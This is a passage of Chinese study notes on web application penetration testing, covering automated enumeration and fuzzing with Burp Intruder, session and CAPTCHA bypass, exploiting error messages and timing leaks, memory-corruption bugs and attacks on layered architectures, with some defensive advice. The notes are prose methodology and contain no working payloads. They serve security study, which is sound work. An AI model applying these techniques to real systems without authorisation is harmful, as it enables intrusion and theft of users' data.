cookie，就可以利用该漏洞，实现攻击目的； 有些浏览器扩展并不区分和隔离普通 HTTP 和加密 HTTPS 的响应内容，而是将它们视为同一来源，因此攻击者通过 HTTP 返回的脚本，就可以通过这些扩展来访问用户使用 HTTPS 访问的内容（借刀杀人）； 当在不安全的网络（例如公共网络 通过 HTTPS 访问敏感内容时，应将浏览器的代理选项设置为“对除 HTTPS 以外的所有协议，使用无效的本地端口”，这样可以一定程度的降低攻击风险； 小结严重的缺陷常常隐藏在大量无关紧要的客户端缺陷中，攻击者可以利用这类缺陷对应用程序实施攻击； 14. 定制攻击自动化应用定制自动化攻击对攻击进行自动化，可以提高攻击的效率；攻击自动化有以下几个常用的场景： 枚举标识符：大多数 Web 应用程序会使用某种标识符来标识资源；标识符的范围也意味着有效资源的数量，因此通过自动枚举标识符，并发送请求，即可快速知道资源的存在范围； 获取数据：通过自动化大量发送请求来爬取有用的数据； 漏洞模糊测试：自动化发送大量设计过的异常字符串，观察应用程序的响应，即可探查应用程序存在哪些潜在的攻击面，作为下一步详细探查的筛选工作； 枚举有效的标识符一些常见的需要枚举有效标识符的情况： 枚举用户名列表，发送大量请求，根据应用程序的响应判断哪些用户名是存在的； 枚举各种资源标识符，如文件ID，账号、雇员编号、日志记录等，根据应用程序的响应，判断存在哪些资源； 枚举令牌（如果生成的令牌存在规律的话），判断存在哪些有效的令牌； 基本步骤先做前期的探查，包括以下两个动作（请求响应对）： 请求的参数包含某个标识符； 当改变这个参数值，服务器的响应也相应发生变化；并能够根据变化的区分，判断标识符是否有效； 探测触点一些常见的响应出现变化的特征 HTTP 状态码 200，请求成功 301或302，请求被重定向到另外一个地址； 401或403，请求未授权或被禁止 404，请求的资源不存在； 500，服务器处理请求的过程中发生错误； 响应长度通常应用程序会使用某个页面模板，并填充数据，生成最终的 HTML 页面；当请求错误时，模板的长度一般要小于正常的模板，因此，通过响应的长度，即可判断请求是否成功； 响应主体请求成功和失败的响应主体正常有所区别，并可以通过某个关键字识别出来，因此可以通过在响应中搜索这个关键字符串，来判断请求是否成功； Location 消息头有些应用程序使用重定向处理资源请求，当成功时，重定向到资源页面；当失败时，重定向到失败页面；因此，通过 Location 消息头字段可以判断请求是否成功； Set-Cookie 消息头当请求有效时，有些应用程序会在 cookie 消息头中进行标识；例如当用户提交的密码正确时，响应会携带 cookie；如果密码无效，则不会； 时间延迟当请求无效时，有可能客户端很多就会收到响应；如果请求有效时，有可能服务器接下来要做很多工作，例如进行大量的计算，因此，通过时间延迟的长短，即可判断所提交的请求是否有效； 编写攻击脚本虽然可以使用命令行脚本来编写，但由于命令行的表达式能力天生比较弱鸡，正常还是使用一些高级语言比较好，例如 Python、Java、Javascript、C# 等； JAttack除了自己编写攻击脚本外，更好的方法是使用一些现成的开源工具，例如 JAttack；JAttack 是用 Java 编写的，它的基本概念是将攻击请求设计成一个类，并通过属性控制哪些字段要在攻击中修改，哪些不能修改，并附上修改的方法，这样就可以很灵活的发送各种预期请求； 获取有用的数据定制并发送专门设计的请求，不但可以利用漏洞获取有用的数据，有时候，即使没有漏洞，仅仅通过枚举的方式，也可以获取到有用的数据，常见情况如下： 应用程序允许用户查看自己的订单，只要在请求中枚举出有效的订单号，就可以查看到其他用户的订单； 通过回答预设问题来实现忘记密码的功能，通过枚举大量的用户名，就可以获取大量的预设问题，然后可从中找到容易猜测答案的问题； 应用程序的某个接口接受一个用户 id，然后就会展示用户的相关信息，包括权限情况等，因此攻击者通过枚举 ID 即可以发现哪些用户账号拥有管理员权限，即可缩小范围，做进一步的针对性攻击； 常见漏洞模糊测试在探查漏洞的阶段，针对解析过程中已知的各种请求参数，针对性的替换为各种专门设计的攻击字符串，然后监控应用程序的响应，即可更加快速的发现应用程序中可能存在的各种漏洞，例如 SQL 注入、命令行注入、路径遍历、XSS 漏洞等； 由于请求参数需要根据应用程序的具体情况进行设计，因此这种类型的定制自动化攻击，往往要比全自动化的工作更有效率；其根本原因在于攻击者可以站在开发者的角度进行换位思考，推测其背后的控制逻辑，这是多数全自动化工具做不到的； 整合全部功能 估计市面上应该有很多将攻击进行自动化的工具，例如本书作者开发的 Burp Intruder，利用这些成熟的工具，可以让攻击更加的快速和高效； 以下是 Burp Intruder 的一些基本功能介绍 选择替换位置在发起大量攻击请求时，基本的作法是在请求中特定位置插入有效荷载，并使用不同的值来替换它；这些插入的位置即可以是请求参数，也可以是请求头部或主体的任何位置； 使用方法： 使用 add 按钮为替换位置添加标记，如上面的截图，在添加标记后，替换位置的前面会使用特殊符号标记起点和终点，并用红色显示整个位置；当发起请求后，这些位置将被有效的攻击荷载替换，如果没有替换，则使用原来的值； 使用 auto 按钮可以自动化标记所有可替换的位置，减少手工标记的工作量； sniper 攻击（狙击）：一次针对一个标记位置，使用所有的有效荷载轮流替换它并发出请求；之后转到下一个位置，重复前面的动作； 非 sniper 攻击：一次请求同时替换多个位置； 设置替换值有效荷载可以自己设计，同时也可以利用 Intruder 现成的内置设计，这样可以节省很多时间，其内置的有效荷载包括： 内置现成的数据列表，并且该列表支持自定义的配置，如添加和修改等； 根据模式对荷载进行定制迭代，假设应用程序接受 ABC45D 形式，则迭代器就可以枚举出所有符合这个规则的值； 字符的大小写替换，例如 password 可替换为 p4ssword, passw0rd, Password, PASSWORD 等，可用于实施密码的蛮力攻击； 数字类型的遍历，例如可用于遍历文档 ID、会话令牌等场景；数字支持多种进制，整数、分数、顺序、递增递减、随机等； 日期：对日期类型的输入进行枚举； 支持 Unicode 编码，对恶意字符的进行编码，避开过滤； 支持对字符块输入进行缓冲区溢出漏洞的探查； 支持对特殊字符集生成各种排列组合； 支持字符打乱和位翻转，系统性的操纵参数值的各个部分，探查应用程序背后的处理逻辑； 支持定制化的预处理：当了解到应用程序的某种处理规则时，在提交请求前，可以先对枚举值进行预处理，以通过应用程序的检查，例如各种编码方案、散列操作、大小写修改等； 默认情况下，Intruder 会对请求中的字面量字符进行 URL 编码，不然该请求会由于不符合 HTTP 规则而失效； 设置响应分析在实施攻击前，需要先明确需要分析响应中的哪些属性，例如扫描错误消息以发现潜在漏洞、扫描特定字符串以便 XSS 注入漏洞等；除了使用特定字符串或者正则表达式来搜索匹配外，还可以设置从响应中提取有用的数据； 攻击1：枚举标识符假设应用程序支持匿名用户注册，则可以通过注册多个账号，连续多次登录，获取不同账号的令牌，了解令牌的生成规律； 当发现某种规律后，就可以根据该规律，大量生成一些潜在可能有效的令牌，然后找到能够验证令牌是否有效的请求响应对，大量发送请求，筛选出有效的令牌； 假设获取的多个令牌如下： 从中可发现主要是最后3位数在变化，因此，可以就最后3位进行枚举 请求一个需要登录后才访问的页面，如用户个人令牌页，如果令牌有效，正常会收到 200 响应；如果无效，正常会被重定向到登录页面； 同时，虽然都是 200 的响应，但根据响应长度的不同，我们还可以猜测到某些令牌返回的响应页面不同，很有可能这些令牌背后是拥有更高级权限的用户，所以页面上显示有更多的菜单；可点击查看该响应中的 HTML 源代码进行确认； 除了状态码外，返回的其他消息头字段如果存在异常，往往意味着里面包含有价值的信息，应该特别进行留意； 攻击2：获取信息应用程序某些页面的请求可能使用 id 参数，此时可以以当前某个有效的 id 为起点，改变 id 的最后两位数，发起请求进行遍历，并配置 Intruder 中的匹配选项，提取指定位置的内容； 攻击3：应用程序模糊测试对于每个 URL，position 选项卡的 auto 功能可以实现自动化的模糊测试，它的原理很简单，即使用常用的有效荷载，逐一替换每一个请求参数，然后收集好响应结果，为下一步分析和发现异常做做好准备工作； 对响应结果进行初步分析可以发现，应用程序可能容易受到 SQL 注入攻击，因为在请求参数中放入一个单引号后，应用程序返回的响应不同，因此接下来可针对该潜在漏洞，进一步分析其利用的可能性； 当现某个潜在漏洞时，可将响应发送到 Repeater 工具，该工具用来针对某个潜在漏洞，修改参数的多种形式，多次重新提交请求，以探查应用程序的处理逻辑，以及避开过滤或者净化的办法； 实施自动化的限制应用程序很可能存在某种防御攻击者提交大量自动化请求的机制，常见的两类： 会话终止：当应用程序发现存在异常请求时，就终止当前会话；或者在某个关键功能中使用反 CSRF 令牌之类的临时参数，或引入多阶段验证，在接收当前请求前，需要先完成一系列的其他请求； CAPTCHA 控件：专门在注册用来防御机器人； 会话终止 针对应用程序终止会话的防御机制，Burp 通过引入下面一些组件来尽可能避开防御机制： cookie 库虽然浏览器会维护一个 cookie 库，Burp 也会自己维护一个，用于相关的组件，同时方便随时根据需要进行更新和修改； 请求宏将多个步骤集成为一个，这样可以在提交每一次的攻击荷载前，先通过宏让应用程序进入接受请求的状态，例如检查当前登录状态、若无效则执行登录获取新会话、获取令牌等工作； 可以使用浏览器来录制宏，并做录制好的每一个步骤配置额外的动作，例如提取有用的信息，用于后续的动作，包括： 是否将库中的 cookie 添加到请求中； 是否将响应中的 cookie 添加到库中； 请求参数是否使用预设值，还是使用在响应中获取的值（当存在反 CSRF 令牌时，该方法很有用）； 会话处理规则原理很简单，即通过对特定请求进行预处理，以避开应用程序的会话限制；由于应用程序可能在不同的功能中使用不同的限制规则，因此需要有针对性的配置规则；当 Burp 发起某个请求时，如果满足预设的匹配条件，就会触发预处理； 匹配规则有：发起请求的 Burp 工具、请求的 URL、请求中的参数名称； 预处理操作包括：添加 cookie ，设置特定的 cookie 或参数值、检查当前会话是否有效并根据结果执行不同的操作、运行宏、提示会话恢复； 配置规则时，有时候避免会出错，导致 Burp 并不按预期的方式进行工作，因此Burp 还提供一项会话处理追踪的功能，用来监控和调试会话处理规则，以便确保配置是否按预期的方式进行； CAPTCHA 控件随着计算机识别图片内容能力的不断强化，事实上现在人类与计算机的水平已经相当，导致 CAPTCHA 已经失去了它在一开始预算起到的作用； 攻击 CAPTCHA 控件搞笑的是，有很多应用程序在发送 CAPTCHA 拼图时，还会悄悄的把答案也发过来，一般有以下几种方式： 拼图的图像通过 URL 加载，拼图的答案就在 URL 的参数或者图片名称中； 拼图的答案放在某个隐藏表单的字段中； 拼图答案出现在 HTML 注释或其他位置（用于调试）； 正常情况下，拼图应该只使用一次后就废弃，但有些应用程序并不是这么做的，而是反复使用；因此，攻击者可以先手工解决某张拼图的答案，然后在请求在反复提交拼图和相应的答案； 自动破解 CAPTCHA 拼图目前绝大多数拼图算法都可以被计算机轻松破解，破解的过程如下： 删除图像中的噪声； 把图片分割单个字母； 识别每个部分中的字母； 目前网上已经有一些非常成熟的库，可以用来处理 CAPTCHA 拼图；针对不同的拼图类型，可以使用不同的库进行处理；事实上，拼图识别效率并不需要 100%，即使只能识别 10%，那么也能够让 10% 的请求变成有效的，而提出大量的请求对计算机来说是最简单不过的任务了； 人类破解者 有一些第三方的付费服务可以调用，让其破解拼图，每破解 1000 个拼图的费用不到 1 美元； 另外攻击者还可以自建一个外表看起来正常的善意的网站，然后实际传输的是目标网站的拼图，并诱使其用户对拼图进行破解；攻击者还经常在其网站上使用竞赛奖励或者免费访问色情内容的方式来吸引用户帮助其破解； 小结 思维方式的不同是真正的 Web 应用程序黑客和普通爱好者之间的最大区别，因为任何工具都替代不了人类的智慧； 15. 利用信息泄露利用错误消息错误消息脚本对于解释型语言来说，其代码实际上是运行在解释器中的，为了方便调试，当发生错误时，大多数解释器都会输出详细的错误信息，以及函数的调用栈等。这意味着如果 Web 应用程序是使用脚本语言来编写的话，如果控制不当，攻击者就有可能获取这些信息，从而为攻击提供便利； 类型不匹配错误：缩小了攻击参数的范围 行号可用来判断每次触发的是否是同一个位置的错误，以及应用程序在处理多个参数时的顺序； 栈追踪当某种由高级语言编写的程序，是运行在某个托管环境中的时候（即解释器，如 Java、C#、Python、JS 等），如果出现了无法处理的错误，那么解释器将会抛出错误，此时浏览器往往会显示完整的栈追踪；栈追踪显示的信息将给攻击带来极大的帮助，主要包括： 可通过栈信息详细了解错误发生的原因，从而可以调整输入，避开错误； 如果程序调用第三方的库，则也会同时显示在栈追踪中，此时可以查阅这些第三方库的源代码，了解它们的行为和逻辑，并下载它们在本地进行测试，探查应用程序处理异常输入的逻辑，发现潜在的漏洞； 调用栈中很可能还会显示一些组件调用的情况，通过组件的命名，可以推测应用程序的内部结构和功能； 栈追踪中显示的行号可用来探查应用程序的逻辑； 栈追踪中通常还包括运行环境的信息，例如框架的名称和版本，从而可以根据该信息，搜索查找其已知的漏洞、异常行为和常见的配置错误等； 详尽的调试信息在开发阶段，开发者通常会让程序输出大量的调试，从而有助于开发者对应用程序进行调试，这些调试信息通常会揭露应用程序当行的运行状态，常见信息包括： 保存在会话中的变量值； 数据库等后端组件的主机名称和密码等敏感信息； 服务器中的文件和目录名称； 保存在会话令牌中的令牌； 数据传输的加密密钥； CPU 寄存器的值、栈内容、加载的 DLL 列表和路径等； 服务器与数据库消息除了应用程序本身，其他组件如数据库、邮件服务器、SOAP 服务器等，在遇到无法处理的错误时，也会抛出详细的错误信息；有时候这些信息会被应用程序放在响应主体中返回到前端，此时攻击者可以利用这些信息，探查到更多的漏洞，常见的利用形式包括： 扩大攻击范围：例如数据库抛出查询错误，从而暴露了 SQL 查找代码的逻辑，攻击者可加以利用，优化 SQL 注入行为； 实施跨站点脚本攻击：有些框架返回错误消息的响应时，没有对错误消息进行 HTML 编码，因此如果错误消息中的某个部分是可以由用户控制的输入，那么此时攻击者就有机会针对性的设计输入，干扰浏览器的解析，实现跨站点脚本注入攻击； 获取解密提示：应用程序可能使用某个解密值对某个加密文件进行解密，但该文档不存在时，该解密值有可能会意外显示在错误消息中； 获取重要的文件路径：错误消息可能会暴露应用程序加载某个服务器文件路径中的文件，此时攻击者可以找机会上传文件，覆盖该路径中的文件； 渗透测试步骤 当通过设计攻击字符串发送大量攻击请求时，应始终监控应用程序的响应，在确定是否包含有用的错误信息；发挥想象力，强制应用程序返回错误响应，例如对未处于就绪状态的资源，发起请求； 应用程序返回的响应内容不一定会显示在浏览器中，应留意所有可能出现错误信息的关键字，例如：error, exception, illegal, invalid, fail, stack, access, directory, file, not found, varchar, ODBC, SQL, SELECT 等； 另外需要留意一下出现在响应中的关键字，是否原本就已经在发送的请求参数中了，如果是的话，则不一定是错误响应，应当排除； 可以使用 Grep 函数来搜索匹配的关键字；如果发现，应当手动检查相应的响应，分析其中是否包含有用的信息； 有些浏览器会隐藏原始的错误消息，然后用一个浏览器自己的定制页面来替代，因此需要提前关闭浏览器的该项功能； 借助搜索引擎不同的 Web 应用程序使用的库不尽相同，经常五花八门，当出现一些未曾见过的错误信息时，只需到网上进行搜索，即可以进一步了解到该错误发生的原因和逻辑； 开发者有时并不一定直接引用某个库，而只是复制部分代码，合并到其源代码中； 渗透测试步骤 使用标准搜索引擎搜索任何不常见的错误消息文本，以及学会使用各种高级搜索特性，缩小搜索的范围，例如：\"unable to retrieve\" filetype:php 同一条错误消息，其他应用程序生成的内容可能更加详细，有助于更好的了解错误发生的条件； 使用 Google 代码搜索功能，查找生成特定错误消息的开源代码；学会使用高级搜索特性指定代码语言和一些已知的细节，从而缩小搜索范围，提高搜索效率，例如 \"unable to retrieve lang:php package:mail\" 如果从栈追踪中得知了所使用的第三方库或组件的名称，则可以直接搜索这些名称； 制造详尽的错误消息攻击者通过系统性的制造错误条件，触发错误消息，很可能可以从错误消息中收获很多有价值的敏感信息。例如让应用程序对某个数据执行某种无效的操作（如字符串转整数），就会自动触发错误条件，导致应用程序报错；如果报错的信息中，会暴露该无效操作要处理的数据，则攻击者就得到了该数据，而且正常情况下，攻击者是不知道该数据的值的； 例如可以在 SQL 注入攻击中，在 SQL 语句中检索某个数据并对其进行错误的类型转换，从而触发 ODBC 的报错，然后从报错消息中得到检索的数据 如果应用程序在报错时，会生成包含错误描述的栈追踪，则可以利用该特性，将想要获取的有用信息，合并到错误描述中； 有些数据库允许开发者创建自定义函数，假设应用程序存在 SQL 注入漏洞，那么攻击者就可以利用该漏洞，注入任意的自定义函数，执行任意的动作。假设应用程序还会返回错误信息给浏览器，那么攻击者就可以故意让函数生成异常，并将获取的信息，放在错误消息中，让应用程序返回。 收集公布的信息由于功能设计需要，应用程序会在界面上有意无意的显示出来一些对攻击者有用的敏感信息，例如： 有效用户名、ID、文档列表等； 用户个人资料、用户角色、权限、最后登录日期、账户状态等； 用户当前使用的密码（一般不会直接显示在页面上，但却出现在响应的源代码中）； 部分日志文件中的信息，如用户名、URL、执行的动作、会话令牌、数据库查询等； HTML 源代码中的注释内容，如链接、表单字段等； 渗透测试步骤： 核对应用程序的解析结果，看哪些服务端功能，或者哪部分客户端数据，可用于获取有用的信息； 找出服务端会返回敏感信息的所有位置（注意：这些敏感信息可能只出现在响应内容中，但没有在界面上显示）； 检查应用程序是否存在访问控制或会话控制的漏洞，如果有，则可以用来获取其他用户的敏感数据； 使用推论有时候，应用程序可能并不会泄露数据，但由于其功能设计缺陷，导致攻击者可以通过逆向推理，获知有用的信息，例如： 如果用户名已经存在，注册功能会给出提示，因此攻击者可以利用这个提示对用户进行枚举； 搜索引擎将所有内容编入索引，在搜索功能中未做权限检查或过滤； 利用 SQL 注入漏洞，一个查询一个字符，虽然查询的内容并不会返回，但是可以将查询结果放入表达式进行计算，若条件成立，则设置其会触发错误，通过是否得到错误响应，来反向推断查询结果是否符合表达式的计算预期； 另外，攻击者还可以通过响应的时间延迟，来推断某些数据是否有效； 许多大型系统由于其数据库的条目较为庞大，单次查询需要花费较多的时间，为了提高性能，一般会使用缓存机制，即将频繁使用放在缓存中；因此，通过访问时间的差别，攻击者可以推断哪些数据最近有被访问； 有些请求需要验证用户的身份信息，因为应用程序需要查询数据库，进行权限的逻辑判断，攻击者可以利用处理时间的差异，枚举出有效的用户名； 当用户在请求中提交一个无效的参数时，有可能造成应用程序的处理超时；根据是否超时，攻击者可以枚举有效的参数值，了解参数值的范围，例如该参数值是服务端内部网络的地址，那么攻击者就可以枚举出有效的主机地址（Burp 工具内置一个响应计时器，可以用来判断这种情况是否出现）； 渗透测试步骤： 总体来说，应用程序在处理大多数请求时，其响应时间的差异非常小，如果有，也很难排除是否是由于随机的网络状况引起的，需要定量统计才能排除；只有少数功能涉及 IO 或 CPU 的密集计算，才会导致存在差异； 为测试某个功能在处理有效和无效数据时，是否存在时间差异，可以准备两个待发送的数据列表，一个全是有效的数据，一个全是无效的，然后不断发送请求，一次只发一个，最后比对二者在响应时间上是否存在统计差异（Burp 有内置自动统计的工具）； 防止信息泄露使用常规错误消息应避免向浏览器返回任何服务端的错误消息或调试消息，而是只返回一种统一的消息格式，同时将服务端的错误或调试消息单独记录在日志文件中；如果需要用户汇报错误情况，则可以给浏览器返回一个日志索引号，当用户反馈错误时，只需要提交该索引号即可； 多数 Web 应用程序框架或者服务器软件都支持拦截错误消息的配置，配置后，错误消息将不会返回给浏览器，而是返回一个统一定制的错误页面； 保护敏感信息应用程序应禁止向浏览器发送任何有关用户的敏感信息，如用户名、用户个人资料、日志记录等；如果用户需要查看这些信息，则应对查看功能加上权限检查，同时，只返回信息的截短后的形式，而不是完全披露现有的数据； 尽量减少客户端信息泄露只要有可能，应该删除或者修改任何有关服务器软件、软件框架名称和版本等相关信息的标记，避免泄露特定的版本信息；同时，应该删除生产环境中的代码的所有注释； 此外，如果在前端使用一些第三方组件，如 Java Applet 或者 ActiveX 控件，则也应该避免在其中存放任何的敏感信息，因为攻击者可以逆向它们； 16. 攻击本地编译型应用程序现在多数 Web 应用程序都不再是本地编译型程序了，它们大多数都运行在某个解释环境中，例如 Java，C#，Python，NodeJS 等；尽管如此，它们仍然有可能调用某些编译型语言写的库，因此，除非有充分的信息说明该应用程序未调用任何本地编译的代码，否则应该对其进行漏洞探查； 本地编译型程序的代码是由 CPU 直接运行的，没有解释环境，因此，它们一般受到缓冲区溢出、格式化字符串、整数漏洞等问题的困扰，当对这些漏洞进行探查时，很容易造成整个应用程序的崩溃（如果是对现有处于生产状态的应用程序进行这方面漏洞的探查工作，则需要知悉这个风险，通常情况下，最好是对测试环境中的程序进行探查比较好）； 本地编译型软件的漏洞是另外一个巨大的课题，如需要进一步研究，作者推荐以下几本参考书： 缓冲区溢出漏洞由于虚拟内存机制，应用程序的指令实际上能够控制的是虚拟内存，物理内存理论上应该不存在缓冲区溢出的问题。溢出问题主要出现在写入的数据，超过了所分配的空间，因此，多出来的部分，覆盖了其他旧数据。当应用程序尝试读取旧数据时，实际上已经被替换为溢出的新数据，此时如果应用程序没有察觉，就有可能信任这些数据并直接使用或者执行。 栈溢出开发者常常犯的一个错误是将某个大小可变的数据，写入某个大小固定的内存中；在开发的时候，开发者会默认正常的输入有最大长度，但如果没有校验和过滤，实际上输入的长度将是任意的； 默认情况下，如果没有特别声明，函数内部的局部变量使用栈来存储临时的数据，因此，攻击者可以通过控制实参的长度，让其超过开发者在函数中分配的变量长度，造成栈溢出； 栈空间是由编译管理和分配的，因此其中保存着函数调用后的返回地址；当发生栈溢出后，原本的返回地址将被改写；但CPU 并不知晓，但其尝试读取返回地址时，实际上很可能会取到攻击写入的其他返回地址，跳转到攻击者注入的代码，执行攻击者预设的指令； 堆溢出堆溢出和栈溢出并没有本质上的区别，唯一的差别是发生的地点在堆上； 堆是由开发者进行管理和分配的，因此里面通常保存着纯数据类型的内容，不像栈中放着返回地址；当发生堆溢出时，会覆盖其他块的头部数据，导致其他块不可用。由于堆通常使用双向链接结构来实现，因此一旦某个块被破坏了，后续的块可能全部不可用了； 因此，如果要利用堆溢出的漏洞，攻击者就必须特别小心，需要精心设计其溢出数据，让其在不破坏原本下一个块的头部数据的基础上，改写其中的指向下一个链表指针。该值被修改后，并不会马上发生什么后果；但是当这个块被回收时，由于堆控制器需要更新链表，因此它需要从块的头部数据中，读取下一个块的址，但实际上，该地址的值已经被攻击者通过溢出修改了。攻击者可以让这个地址的值，指向任意位置，执行其注入的指令；一般攻击者会让改写后的指针值，指向下一个被调用的函数地址，这样该函数就会在接下来执行；或者指向异常处理函数的地址，这样当下次发生异常时，函数会被执行； 由于开发者的编程错误不可避免，因此目前很多编译器和操作系统已经设计出了各种机制，来尽量缓冲区溢出的问题；整体来说，缓冲区溢出漏洞的利用比以往要难得多； 一位偏移漏洞 理论上，为了避免出现缓冲区溢出，开发者在复制参数内容，写入分配的缓冲区时，应该控制写入的长度，示例如下： 在代码中，开发者已经将长度控制在 32 位了，但是，由于字符串最后还需要一个终止符，所以实际字符串的最大长度只能是 31 位；此时，如果攻击者传入 32 位的字符串参数，将导致终止符溢出，覆盖邻近内存上的数据； 通常字符串的终止符只有一个字节的长度，而邻近的内存，正常是另外一个栈桢的头部，该头部通常包含着返回地址；当溢出发生时，原本的返回地址将有一个低位字节被改写为零（地址通常不止一个字符，例如 32 位的字符有4个字节）；被改写后的返回地址的值变小了，因此很可能会重新指向原本的 _username 缓冲区中，从而指向攻击者控制的数据；如果攻击者精心设计其输入的数据，那么便有可能接管接下来要执行的指令； 另外还有一种漏洞，是开发者忘了给缓冲区中的字符串添加终止符， 这样会导致编译器无法在预期的位置结束字符串，而是会一直往下读取，直到遇到值为零的字符为止； 这种漏洞会造成应用程序一些奇怪的异常行为，它使用变量值变长了，如果该变量值有可能被返回到浏览器的话，那么攻击者就可以利用这个漏洞来获取内存中的其他数据，造成信息泄露的风险； 查找缓冲区溢出漏洞大多数情况下，向应用程序发送一个超过其预期长度的字符串，即可以探查出是否存在缓冲区溢出漏洞（少数漏洞需要发送特定的长度，或者特定范围内的长度）； 渗透测试步骤： 由于开发者通常喜欢使用 2 的整数倍做为字符串缓冲区长度，例如 32，128，512，4096 等；因此可向每个目标数据，提交一稍大于缓冲区大小的长字符串，例如 1100， 4200， 33000 等； 一次只攻击一个目标数据； 轮流发起攻击，尽量覆盖所有的目标数据； 可以使用第三方工具如 Burp 设置好规则，然后自动生成各种大小的有效攻击数据； 监控应用程序的反应，看看有没有发生什么异常现象；常见的异常包括： HTTP 500 状态码或者出现错误消息（跟不符合格式的输入造成的异常不同）； 比常规内容更详细的错误消息（很可能意味着某个组件发生了错误）； TCP 没有响应或者突然关闭； 整个 Web 应用程序停止响应； 当发生堆溢出时，一般并不会马上导致程序崩溃，但是很有可能会在后续某个时间点造成崩溃；因此，要确定哪些字符串造成崩溃，还需要一定的观察时间； 一位偏移漏洞一般不会造成崩溃，但一般会导致出现异常行为，此时应用程序可能会返回异常的数据内容； 通常情况下，应用程序会对输入的参数长度进行检查，并告知长度不符合要求，此时可以在其允许的范围内，尽可能的大；另外应用程序的检查机制可能还会限制参数的字符范围，因此，在探查漏洞前，攻击者应该先了解清楚参数规则，然后确保每个参数都符合规则的情况下，长度尽量长（通常可以使用一个已经验证有效的请求中的参数的字符串，然后加大其长度即可）； 有时候尽管发现了缓冲区溢出漏洞，但是要对其加以利用，仍然要面临很多挑战待解决 整数漏洞计算器以有限的位数，来模拟无限的计算，因此在某些特定的情况下，这种计算存在溢出的风险； 整数溢出当某个整数的计算结果超过了处理器可处理的最大值或者最小值时，就会发生溢出，这时计算结果会从最大值进入一个极小值，或者反过来，从最小值进入一个极大值； 上面这段代码计算了参数的长度，并增加 1 个字节，用来存储结束符；但由于长度的类型是 short，每种类型的整数，都有一个能够表示的最大值，对于 short 来说是 65535，因此，当长度计算结果超过了 65535 时，计算并存储结果时，就会发生溢出；攻击者可以利用这个漏洞，让参数长度为 65535，添加 1 后，溢出为 0；malloc 分配了一个长度为 0 的缓冲区，当向缓冲区写入数据时，很可能会覆盖邻近的缓冲区； 符号错误在 C 和 C++ 中，有一个讨厌的地方，即整数存在有符号和无符号两种类型，有符号指有正负符号，它需要占用一个位来存储符号；无符号则可以节省一个位，因此可表示的正整数范围更大一些。但是这也引入了一些安全隐患，即开发者在编写代码时，有时候不小心会将两种不同符号类型的变量放在一起计算，这些导致隐式的符号转换，编译器的处理方式是统一转换成无符号类型，这种转换并没有实际性的改变内存中的数据，而只是在逻辑层面，对内存中的数据换类型进行解读，因此原本有符号值，如果按无符号进行解读，有可能从负数变成一个很大的正数； 攻击者可以利用这个特点，传入一个负数，之后被 strncpy 隐式转换为很大的正数，导致处理器向原本很小的缓冲区尝试写入一个很大长度的字符串，从而发生溢出； 查找整数漏洞如果客户端提交的请求中包含整数值，就意味着有可能存在整数溢出的漏洞，常见情况如下： 客户端在请求参数、cookie、消息主体中，提交以十进制表示的整数值，此时应特别留意那些表示某个字符串长度的整数值； 有时候表示长度的整数值来源于某个二进制对象，因此并不以十进制表示，而是以十六进制表示，或者使用 Base64 编码，以便于进行 HTTP 传输； 渗透测试步骤： 当发现存在整数参数值，就可以尝试轮流发送不同的值，这些值分别是有符号和有符号类型的边界值； 如果参数以十六进制表示，则将上一步的边界值转换为相应的大端法或小端法的版本，如果十六进制值以 ASCII 格式提交，则应转换成相应的编码字符，确保可以被服务端正确解析 监控提交请求后，应用程序是否出现异常行为 格式化字符串漏洞 某些函数接受格式说明符（例如 C 语言中的 printf），有时候这些函数存在被滥用的漏洞。通常这类型的函数接受的变量数量是不定的，并且支持多种类型的参数；其中一个非常危险的格式说明符是 %n，它跟普通的格式说明符的意思很不一样，它表示接受一个指针作为参数，之后会将该说明符之前函数输出的字节数量写入到指针指向的位置； 这意味着如果攻击者能够控制全部或部分传入的参数，那么就可以修改指针值，让函数调用成功后，将结果写入到其指定的位置，覆盖原来的值，从而导致后续处理器读取的内容发生变化，并跳转到攻击者指定的位置，执行任意的代码； 查找格式化字符串漏洞探查格式化字符串漏洞的一个基本办法是在提交的请求参数中，包含大量的格式符，看应用程序如何处理它们；通常来说，如果应用程度存在这方面的漏洞，很有可能导致应用程序崩溃； 渗透测试步骤： 轮流向每个目标参数提交包含大量格式化符 %n 和 %s 的字符串； Windows FormatMessage 函数处理 prinft 函数中的说明符的方式略有不同，因此提交的参数应改写如下： 另外需要将 % 符号使用 URL 编码编成 %25，以便服务端能够正确解析 监控应用程序是否出现异常反应； 小结整体来说，即使应用程序存在上述的各种漏洞，因此程序是部署在服务端，攻击者无法像安装在本地端一样对其进行反复的测试探查，因此利用上述漏洞的难度较大。一般攻击比较有可能利用一位偏移的漏洞； 17. 攻击应用程序架构为了提高应用程序的可移植性和健壮性，通常都会对应用程序的各项功能进行模块化，并在模块之间约定好交互方式，这样可以极大的降低代码的耦合性； 分层架构最常见的三层架构分别如下： 以下是 Java 应用的典型分层 攻击分层架构利用层之间的信任关系假设应用程序中有一层专门负责访问权限检查，另外一层负责数据库查询，通常来说，数据库查询层会默认假设从权限检查层发过来的请求都是已经通过审查的，是有效的，因此会直接执行该层发过来的请求。但是这种假设存在漏洞，即如果攻击者攻陷了权限检查层（例如利用 SQL 注入漏洞），并发出任意请求给数据库查询层，则可以查询任意的数据，而不管是否使用管理员的身份进行查询； 分层架构存在另外一个问题，即层与层之间的信息可能存在隔离，利用数据库查询日志显示攻击者注入的每一条查询；但是日志中可能并没有存储是哪一名用户发起的攻击，需要与业务日志进行交互比对和排查，才有可能定位； 破坏其他层如果几个层都在相同的计算机上运行，则攻陷某一层后，攻击者就可以直接破坏其他层实施的安全保护，示例如下： 访问解密算法通常情况下，用户的密码不应该在服务端明文保存，而是会进行散列处理，单向加密，确保即使数据库泄露，攻击者也无法提取到密码；但是有些敏感数据只能使用对称加密，因为后续还需要使用它们的明文，例如信用卡号、安全问题等；此时，如果数据库中除了存储加密后的数据，还直接存储密钥的话，那么攻击者一旦攻陷数据层（例如利用 SQL 注入漏洞），则可以直接查询到密钥，从而实现对数据的解密； 利用文件读取提取 MySQL 数据假设应用程序存在路径遍历漏洞，那么攻击者可以利用这个漏洞，读取服务器上的数据库文件，绕开数据库和应用程序设置的权限控制机制； 使用本地文件包含命令多数应用程序都会读取和访问一些本地文件，如果存在漏洞，意味着攻击者可以漏洞读取服务器上的任意文件内容，造成敏感信息泄露；如果应用程序存在文件写入漏洞的话，则攻击者可以利用该漏洞，向任意文件中写入其指定的内容（例如通过 URL 下载包含恶意命令的远程脚本，注入日志文件），并设置或等待条件触发其执行（例如包含并读取日志文件，触发提前注入的恶意命令的执行）； 